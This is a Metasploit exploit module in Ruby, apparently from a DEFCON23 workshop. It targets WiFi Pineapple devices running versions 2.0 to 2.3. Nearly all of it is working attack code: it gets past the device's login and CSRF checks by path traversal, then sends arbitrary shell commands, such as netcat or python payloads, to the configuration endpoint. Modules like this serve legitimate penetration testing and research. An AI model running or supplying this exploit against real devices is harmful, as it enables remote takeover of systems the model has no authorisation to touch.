# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Hak5 WiFi Pineapple Preconfiguration Command Injection&#039;,
      &#039;Description&#039;    => %q{
      This module exploits a login/csrf check bypass vulnerability on WiFi Pineapples version 2.0 <= pineapple < 2.4.
      These devices may typically be identified by their SSID beacons of &#039;Pineapple5_....&#039;;
      Provided as part of the TospoVirus workshop at DEFCON23.
      },
      &#039;Author&#039;         => [&#039;catatonicprime&#039;],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     => [ ],
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        => {
        &#039;Space&#039;        => 2048,
        &#039;DisableNops&#039;  => true,
        &#039;Compat&#039;       =>
          {
            &#039;PayloadType&#039; => &#039;cmd&#039;,
            &#039;RequiredCmd&#039; => &#039;generic python netcat telnet&#039;
          }
      },
      &#039;Targets&#039;        =>
        [
          [ &#039;WiFi Pineapple 2.0.0 - 2.3.0&#039;, {} ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Aug 1 2015&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Path to the command injection&#039;, &#039;/components/system/configuration/functions.php&#039; ]),
        Opt::RPORT(1471),
        Opt::RHOST(&#039;172.16.42.1&#039;)
      ]
    )

    deregister_options(
      &#039;ContextInformationFile&#039;,
      &#039;DOMAIN&#039;,
      &#039;DigestAuthIIS&#039;,
      &#039;EnableContextEncoding&#039;,
      &#039;FingerprintCheck&#039;,
      &#039;HttpClientTimeout&#039;,
      &#039;NTLM::SendLM&#039;,
      &#039;NTLM::SendNTLM&#039;,
      &#039;NTLM::SendSPN&#039;,
      &#039;NTLM::UseLMKey&#039;,
      &#039;NTLM::UseNTLM2_session&#039;,
      &#039;NTLM::UseNTLMv2&#039;,
      &#039;SSL&#039;,
      &#039;SSLVersion&#039;,
      &#039;VERBOSE&#039;,
      &#039;WORKSPACE&#039;,
      &#039;WfsDelay&#039;,
      &#039;Proxies&#039;,
      &#039;VHOST&#039;
    )
  end

  def cmd_uri
    normalize_uri(&#039;includes&#039;, &#039;css&#039;, &#039;styles.php&#039;, &#039;../../..&#039;, target_uri.path)
  end

  def cmd_inject(cmd)
    res = send_request_cgi(
      &#039;method&#039;     => &#039;POST&#039;,
      &#039;uri&#039;        => cmd_uri,
      &#039;vars_get&#039;   => {
        &#039;execute&#039;  => "" # Presence triggers command execution
      },
      &#039;vars_post&#039;  => {
        &#039;commands&#039; => cmd
      })
    res
  end

  def check
    res = cmd_inject("echo")
    if res && res.code == 200 && res.body =~ /Executing/
      return Exploit::CheckCode::Vulnerable
    end
    Exploit::CheckCode::Safe
  end

  def exploit
    print_status(&#039;Attempting to bypass login/csrf checks...&#039;)
    unless check
      fail_with(Failure::NoAccess, &#039;Failed to bypass login/csrf check...&#039;)
    end
    print_status(&#039;Executing payload...&#039;)
    cmd_inject("#{payload.encoded}")
  end
end

